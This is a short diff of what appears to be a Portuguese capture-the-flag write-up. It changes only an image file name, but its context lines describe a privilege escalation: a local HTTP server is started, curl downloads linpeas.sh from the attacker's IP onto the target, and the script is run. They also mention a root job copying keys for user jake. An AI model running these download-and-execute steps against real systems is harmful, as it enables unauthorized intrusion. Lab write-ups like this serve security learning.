@@ -55,7 +55,7 @@ Primeiro, ligamos nosso servidor HTTP com: ```python3 -m http.server 8080```
 Em seguida, na máquina-alvo, buscamos com: ```curl http://[ip_address]:[port]/linpeas.sh -o /tmp/linpeas.sh```; obs: com ```wget``` estava dando erro  
 Damos as permissões necessárias e em seguida, executamos  
 
-![](bkp_ssh.jpg)
+![](bck_ssh.jpg)
 
 Este arquivo parece estar sendo executado como _root_, copiando o conteúdo de _/opt/.backups/jake_id_rsa.pub.backup_ para as chaves de **jake**  
 Podemos realizar o seguinte:
